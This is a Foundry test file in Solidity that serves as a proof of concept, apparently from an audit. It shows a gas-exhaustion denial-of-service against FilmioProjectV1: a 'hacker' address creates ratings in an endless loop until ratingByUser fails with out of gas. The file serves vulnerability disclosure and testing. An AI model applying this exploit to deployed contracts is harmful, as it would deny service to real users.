// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/StdUtils.sol" ;
import { FilmioProjectV1 } from "src/Project/FilmioProjectV1.sol";

contract PoCDoSRatingByUser is Test {
    function testPoCDoS() public {
        address owner = address(1);
        address hacker = address(666);

        // Deploy the Contract
        vm.prank(owner);
        FilmioProjectV1 filmio = new FilmioProjectV1();

        // Initialize
        filmio.initialize(address(2));

        // Add elements to `userRatings[user].ratingIds` to generate a DoS(out of gas)
        for (uint256 i = 100; true; i++) {
            string memory projectId = string(abi.encode(i));
            vm.prank(owner);
            filmio.createLock(projectId);

            vm.prank(hacker);
            filmio.createRating(projectId, 1);

            // When the `userRatings[user].ratingIds` array is big enough, it will fail with Reason: EvmError: OutOfGas
            filmio.ratingByUser(hacker);
        }
    }
}